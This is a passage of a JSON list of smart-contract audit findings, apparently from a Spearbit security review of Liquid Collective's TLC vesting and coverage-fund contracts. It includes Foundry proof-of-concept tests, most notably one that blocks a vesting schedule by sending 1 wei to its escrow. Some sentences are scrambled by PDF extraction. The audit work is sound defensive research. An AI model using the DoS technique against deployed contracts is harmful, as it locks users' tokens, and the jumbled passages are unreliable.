        "title": "A malicious user could DOS a vesting schedule by sending only 1 wei of TLC to the vesting escrow address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending just 1 wei of TLC to the escrow address related to the vesting schedule. By doing that:  The creator of the vesting schedule will not be able to revoke the vesting schedule.  The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the vesting schedule.  Any external contracts or dApps will not be able to call computeVestingReleasableAmount . In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un- derflow error when called before the vesting schedule ends. The underflow error leasableAmount will enter uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) - balanceOf(_escrow); is thrown because, when called before the schedule ends, _computeVestingRe- try to compute the if (_time < _vestingSchedule.end) branch and will In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than balanceOf(_escrow) and the contract will revert with an underflow error. When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the malicious user. Scenario: 1) Bob owns 1 TLC token. 2) Alluvial creates a vesting schedule for Alice like the following example: createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); 3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule. 8 4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is 11 it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10. Find below a test case showing all three different DOS scenarios: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDOSReleaseVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice 9 vm.prank(bob); tlc.transfer(aliceEscrow, 1); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); // The transaction will revert for UNDERFLOW because now the balance of the escrow has been ,! increased externally vm.expectRevert(stdError.arithmeticError); tlc.releaseVestingSchedule(0); // Warp at the vesting schedule period end vm.warp(block.timestamp + 9 days); // Alice is able to get the whole vesting schedule amount // plus the token sent by the attacker to the escrow contract vm.prank(alice); tlc.releaseVestingSchedule(0); assertEq(tlc.balanceOf(alice), 11); } function testDOSRevokeVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); // The creator decide to revoke the vesting schedule before the end timestamp // It will throw an underflow error vm.prank(initAccount); vm.expectRevert(stdError.arithmeticError); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1)); } function testDOSComputeVestingReleasableAmount() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice 10 vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); vm.expectRevert(stdError.arithmeticError); uint256 releasableAmount = tlc.computeVestingReleasableAmount(0); // Warp to the end of the vesting schedule vm.warp(block.timestamp + 10 days); releasableAmount = tlc.computeVestingReleasableAmount(0); assertEq(releasableAmount, 11); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } 11 }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Coverage funds might be pulled not only for the purpose of covering slashing losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The newly introduced coverage fund is a smart contract that holds ETH to cover a potential lsETH price decrease due to unexpected slashing events. Funds might be pulled from CoverageFundV1 to the River contract through setConsensusLayerData to cover the losses and keep the share price stable In practice, however, it is possible that these funds will be pulled not only in emergency events. _maxIncrease is used as a measure to enforce the maximum difference between prevTotalEth and postTotalEth, but in practice, it is being used as a mandatory growth factor in the context of coverage funds, which might cause the pulling of funds from the coverage fund to ensure _maxIncrease of revenue in case fees are not high enough.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Consider preventing CoverageFundAddress to be set as address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of River.setCoverageFund and CoverageFundAddress.set both func- tion do not revert when the _newCoverageFund address parameter is equal to address(0). If the Coverage Fund address is empty, the River._pullCoverageFunds function will return earlier and will not pull any coverage fund.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "CoverageFund.initCoverageFundV1 might be front-runnable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Upgradeable contracts are used in the project, mostly relying on a TUPProxy contract. Initializing a contract is a 2 phase process where the first call is the actual deployment and the second call is a call to the init function itself. From our experience with the repository, the upgradeable contracts deployment scripts are using the TUPProxy correctly, however in that case we were not able to find the deployment script for CoverFund, so we decided to raise this point to make sure you are following the previous policy also for this contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Account owner of the minted TLC tokens must call delegate to own vote power of initial minted tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "ken.delegate(accountOwner) to auto-delegate to itself, otherwise it will have zero voting power. the minted TLC tokens must The _account owner of remember to call tlcTo- Without doing that anyone (even with just 1 voting power) could make any proposal pass and in the future manage the DAO proposing, rejecting or accepting/executing proposals. As the OpenZeppelin ERC20 documentation says: By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Consider using unchecked block to save some gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Because of the if statement, it is impossible for vestedAmount - releasedAmount to underflow, thus allowing the usage of the unchecked block to save a bit of gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "createVestingSchedule allows the creation of a vesting schedule that could release zero tokens after a period has passed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Depending on the value of duration or amount it is possible to create a vesting schedule that would release zero token after a whole period has elapsed. This is an edge case scenario but would still be possible given that createVestingSchedule can be called by anyone and not only Alluvial. See the following test case for an example //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDistributeZeroPerPeriod() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, duration: 365 days, period: 1 days, amount: 100, beneficiary: alice, delegatee: address(0), 15 revocable: true }) ); // One whole period pass and alice check how many tokens she can release vm.warp(block.timestamp + 1 days); uint256 releasable = tlc.computeVestingReleasableAmount(0); assertEq(releasable, 0); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "CoverageFund - Checks-Effects-Interactions best practice is violated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "We were not able to find any concrete instances of harmful reentrancy attack vectors in this contract, but it's recommended to follow the Checks-effects-interactions pattern anyway.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "River contract allows setting an empty metadata URI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of River.setMetadataURI and MetadataURI.set both allow the current value of the metadata URI to be updated to an empty string.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider requiring that the _cliffDuration is a multiple of _period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "When a vesting schedule is created via _createVestingSchedule, the only check made on _period parameter (other than being greater than zero) is that the _duration must be a multiple of _period. If after the _cliffDuration the user can already release the matured vested tokens, it could make sense to also require that _cliffDuration % _period == 0",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add documentation about the scenario where a vesting schedule can be created in the past",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of ERC20VestableVotesUpgradeable _createVestingSchedule func- tion, there is no check for the _start value. This means that the creator of a vesting schedule could create a schedule that starts in the past. Allowing the creation of a vesting schedule with a past _start also influences the behavior of _revokeVestingSchedule (see ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked).",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _createVestingSchedule allows the creation of vesting schedules that  Start in the past: _start < block.timestamp.  Have already ended: _start + _duration < block.timestamp. Because of this behavior, in case of the creation of a past vesting schedule that has already ended  The _beneficiary can instantly call (if there's no lock period) releaseVestingSchedule to release the whole amount of tokens.  The creator of the vesting schedule cannot call revokeVestingSchedule because the new end would be in the past and the transaction would revert with an InvalidRevokedVestingScheduleEnd error. The second scenario is particularly important because it does not allow the creator to reduce the length or remove the schedule entirely in case the schedule has been created mistakenly or with a misconfiguration (too many token vested, lock period too long, etc...).",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "getVestingSchedule returns misleading information if the vesting token creator revokes the sched- ule",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The getVestingSchedule function returns the information about the created vesting schedule. The duration represents the number of seconds of the vesting period and the amount represents the number of tokens that have been scheduled to be released after the period end (or after lockDuration if it has been configured to be greater than end). If the creator of the vesting schedule calls revokeVestingSchedule, only the end of the vesting schedule struct will be updated. If external contracts or dApps rely only on the getVestingSchedule information there could be scenarios where they display or base their logic on wrong information. Consider the following example. Alluvial creates a vesting schedule for alice with the following config 18 { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true This means that after 10 days, Alice would own in her balance 10 TLC tokens. If Alluvial calls revokeVestingSchedule before the cliff period ends, all of the tokens will be returned to Alluvial but the getVestingSchedule function would still display the same information with just the end attribute updated. An external dApp or contract that does not check the new end and compares it to cliffDuration, lockDura- tion, and period but only uses the amount would display the wrong number of vested tokens for Alice at a given timestamp.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule. This function returns the value returned by _computeVestedAmount that relies on duration and amount while the only attribute changed by revokeVestingSchedule is the end. 19 function _computeVestedAmount(VestingSchedules.VestingSchedule memory _vestingSchedule, uint256 _time) internal pure returns (uint256) { if (_time < _vestingSchedule.start + _vestingSchedule.cliffDuration) { // pre-cliff no tokens have been vested return 0; } else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) { // post vesting all tokens have been vested return _vestingSchedule.amount; } else { uint256 timeFromStart = _time - _vestingSchedule.start; // compute tokens vested for completly elapsed periods uint256 vestedDuration = timeFromStart - (timeFromStart % _vestingSchedule.period); return (vestedDuration * _vestingSchedule.amount) / _vestingSchedule.duration; } } If the creator revokes the schedule, the computeVestingVestedAmount would return more tokens compared to the amount that the user has vested in reality. Consider the following example. Alluvial creates a vesting schedule with the following config { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true Alluvial then calls revokeVestingSchedule(0, uint64(block.timestamp + 5 days));. The effect of this trans- action would return 5 tokens to Alluvial and set the new end to block.timestamp + 5 days. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + 7 days), it would return 7 because _computeVestedAmount would execute the code in the else branch. But alice cannot have more than 5 vested tokens because of the previous revoke. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + duration)it would return 10 because _computeVestedAmount would execute the code in the else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) branch. But alice cannot have more than 5 vested tokens because of the previous revoke. Attached test below to reproduce it: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { 20 function __computeVestingReleasableAmount(uint256 vestingID, uint256 _time) external view returns (uint256) { ,! return _computeVestingReleasableAmount( VestingSchedules.get(vestingID), _deterministicVestingEscrow(vestingID), _time ); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal creator; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); creator = makeAddr(\"creator\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testIncorrectComputeVestingVestedAmount() public { vm.prank(initAccount); tlc.transfer(creator, 10); // create a vesting schedule for Alice vm.prank(creator); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); // creator call revokeVestingSchedule revoking the vested schedule setting the new end as half ,! of the duration // 5 tokens are returned to the creator and `end` is updated to the new value // this means also that at max alice will have 5 token vested (and releasable) vm.prank(creator); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 5 days)); // We warp at day 7 of the schedule vm.warp(block.timestamp + 7 days); 21 // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 7); // We warp at day 10 (we reached the total duration of the vesting) vm.warp(block.timestamp + 3 days); // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 10); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing clear documentation on how the voting power and delegation works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "ERC20VotesUpgradeable contract. As the official OpenZeppelin documentation says (also reported in the Alluvial's natspec contract): ERC20VestableVotesUpgradeableV1 extension The an of is By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. Because of how ERC20VotesUpgradeable behaves on voting power and delegation of voting power could be coun- terintuitive for normal users who are not aware of it, Alluvial should be very explicit on how users should act when a vesting schedule is created for them. When a Vote Token is transferred, ERC20VotesUpgradeable calls the hook _afterTokenTransfer function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._afterTokenTransfer(from, to, amount); _moveVotingPower(delegates(from), delegates(to), amount); } In this case, _moveVotingPower(delegates(from), delegates(to), amount); will decrease the voting power of delegates(from) by amount and will increase the voting power of delegates(to) by amount. This applies if some conditions are true, but you can see them here function _moveVotingPower( address src, address dst, uint256 amount ) private { if (src != dst && amount > 0) { if (src != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[src], _subtract, ,! amount); emit DelegateVotesChanged(src, oldWeight, newWeight); } if (dst != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[dst], _add, amount); emit DelegateVotesChanged(dst, oldWeight, newWeight); } } } When a vesting schedule is created, the creator has two options: 1) Specify a custom delegatee different from the beneficiary (or equal to it, but it's the same as option 2). 2) Leave the delegatee empty (equal to address(0)).  Scenario 1) empty delegatee OR delegatee === beneficiary (same thing) After creating the vesting schedule, the voting power of the beneficiary will be equal to the amount of tokens vested. If the beneficiary did not call tlc.delegate(beneficiary) previously, after releasing some tokens, its voting power will be decreased by the amount of released tokens. 23  Scenario 2) delegatee !== beneficiary && delegatee !== address(0) Same thing as before, but now we have two different actors, one is the beneficiary and another one is the delegatee of the voting power of the vested tokens. If the beneficiary did not call tlc.delegate(vestingScheduleDelegatee) previously, after releasing some to- kens, the voting power of the current vested schedule's delegatee will be decreased by the amount of released tokens.  Related test for scenario 1 //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testLosingPowerAfterRelease() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: false }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); assertEq(tlc.getVotes(alice), 10); 24 assertEq(tlc.balanceOf(alice), 0); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); tlc.releaseVestingSchedule(0); // Alice now owns the vested tokens just released but her voting power has decreased by the ,! amount released assertEq(tlc.getVotes(alice), 9); assertEq(tlc.balanceOf(alice), 1); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix mismatch between revert error message and code behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The error message requires the schedule duration to be greater than the cliff duration, but the code allows it to be greater than or equal to the cliff duration.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve documentation and naming of period variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Similar to Consider renaming period to periodDuration to be more descriptive, the variable name and documentation are ambiguous. We can give a more descriptive name to the variable and fix the documenta- tion.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming period to periodDuration to be more descriptive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "period can be confused as (for example) a counter or an id.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider removing coverageFunds variable and explicitly initialize executionLayerFees to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Inside the OracleManager.setConsensusLayerData the coverageFunds variable is declared but never used. Consider cleaning the code by removing the unused variable. The executionLayerFees variable instead should be explicitly initialized to zero to not rely on compiler assump- tions.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming IVestingScheduleManagerV1 interface to IERC20VestableVotesUpgradeableV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The IVestingScheduleManager interface contains all ERC20VestableVotesUpgradeableV1 needs to implement and use. the events, errors, and functions that Because there's no corresponding VestingScheduleManager contract implementation, it would make sense to rename the interface to IERC20VestableVotesUpgradeableV1.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming CoverageFundAddress COVERAGE_FUND_ADDRESS to be consistent with the current naming convention",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Consider renaming the constant used to access the unstructured storage slot COVERAGE_FUND_- ADDRESS. To follow the naming convention already adopted across all the contracts, the variable should be renamed to COVERAGE_FUND_ADDRESS_SLOT.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting if the msg.value is zero in CoverageFundV1.donate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of CoverageFundV1.donate there is no check on the msg.value value. Because of this, the sender can \"spam\" the function and emit multiple useless Donate events.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider having a separate function in River contract that allows CoverageFundV1 to send funds instead of using the same function used by ELFeeRecipientV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "When the River contract calls the CoverageFundV1 contract to pull funds, the CoverageFundV1 sends funds to River by calling IRiverV1(payable(river)).sendELFees{value: amount}();. sendELFees is a function that is currently used by both CoverageFundV1 and ELFeeRecipientV1. function sendELFees() external payable { if (msg.sender != ELFeeRecipientAddress.get() && msg.sender != CoverageFundAddress.get()) { revert LibErrors.Unauthorized(msg.sender); } } It would be cleaner to have a separate function callable only by the CoverageFundV1 contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extensively document how the Coverage Funds contract works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The Coverage Fund contract has a crucial role inside the Protocol, and the current contract's docu- mentation does not properly cover all the needed aspects. Consider documenting the following aspects:  General explanation of the Coverage Funds and it's purpose.  Will donations happen only after a slash/penalty event? Or is there a \"budget\" that will be dumped on the contract regardless of any slashing events?  If a donation of XXX ETH is made, how is it handled? In a single transaction or distributed over a period of time?  Explain carefully that when ETH is donated, no shares are minted.  Explain all the possible market repercussions of the integration of Coverage Funds.  Is there any off-chain validation process before donating? 29  Who are the entities that are enabled to donate to the fund?  How is the Coverage Funds integrated inside the current Alluvial protocol?  Any additional information useful for the users, investors, and other actors that interact with the protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong natspec comment and typos",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": " Natspec  Missing part of the natspec comment for /// @notice Attempt to revoke at a relative to InvalidRevokedVestingScheduleEnd in IVestingScheduleManager  Natspec missing the @return part for getVestingSchedule in IVestingScheduleManager.  Wrong order of natspec @param for createVestingSchedule in IVestingScheduleManager. The @param _beneficiary should be placed before @param _delegatee to follow the function signature order.  Natspec missing the @return part for delegateVestingEscrow in IVestingScheduleManager.  Wrong natspec comment, operators should be replaced with vesting schedules for @custom:attribute of struct SlotVestingSchedule in VestingSchedules. 30  Wrong natspec parameter, replace operator with vesting schedule in the VestingSchedules.push func- tion.  Missing @return natspec for _delegateVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _deterministicVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _getCurrentTime in ERC20VestableVotesUpgradeable.  Add the Coverage Funds as a source of \"extra funds\" in the Oracle._pushToRiver natspec documentation in Oracle.  Update the InvalidCall natspec in ICoverageFundV1 given that the error is thrown also in the receive() external payable function of CoverageFundV1.  Update the natspec of struct VestingSchedule lockDuration attribute in VestingSchedules by explaining that the lock duration of a vesting schedule could possibly exceed the overall duration of the vesting.  Update the natspec of lockDuration in ERC20VestableVotesUpgradeable by explaining that the lock dura- tion of a vesting schedule could possibly exceed the overall duration of the vesting.  Consider making the natspec documentation of struct VestingSchedule in VestingSchedules and the natspec in ERC20VestableVotesUpgradeable be in sync.  Add more examples (variations) to the natspec documentation of the vesting schedules example in ERC20VestableVotesUpgradeable to explain all the possible combination of scenarios.  Make the ERC20VestableVotesUpgradeable natspec documentation about the vesting schedule consis- tent with the natspec documentation of _createVestingSchedule and VestingSchedules struct Vest- ingSchedule.  Typos  Replace all Overriden instances with Overridden in River.  Replace transfer with transfers in ERC20VestableVotesUpgradeable.1.sol#L147.  Replace token with tokens in ERC20VestableVotesUpgradeable.1.sol#L156.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different behavior between River _pullELFees and _pullCoverageFunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
